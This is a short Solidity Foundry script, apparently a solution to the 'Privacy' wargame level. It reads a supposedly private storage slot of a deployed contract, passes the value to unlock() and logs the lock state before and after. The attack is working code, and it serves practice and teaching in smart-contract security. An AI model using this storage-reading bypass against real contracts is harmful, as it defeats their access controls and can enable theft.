// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Privacy.sol";
import "forge-std/Script.sol";

contract PrivacySol is Script {
    Privacy public privacy_ = Privacy(0x6CAA5196E88899D1c30aabFa4dB9ac8a0092f4B0);

    function run() external {
        vm.startBroadcast();

        console.log("Befor locked: ", privacy_.locked());
        privacy_.unlock(bytes16(vm.load(address(privacy_), bytes32(uint256(5)))));
        console.log("After locked: ", privacy_.locked());

        vm.stopBroadcast();
    }
}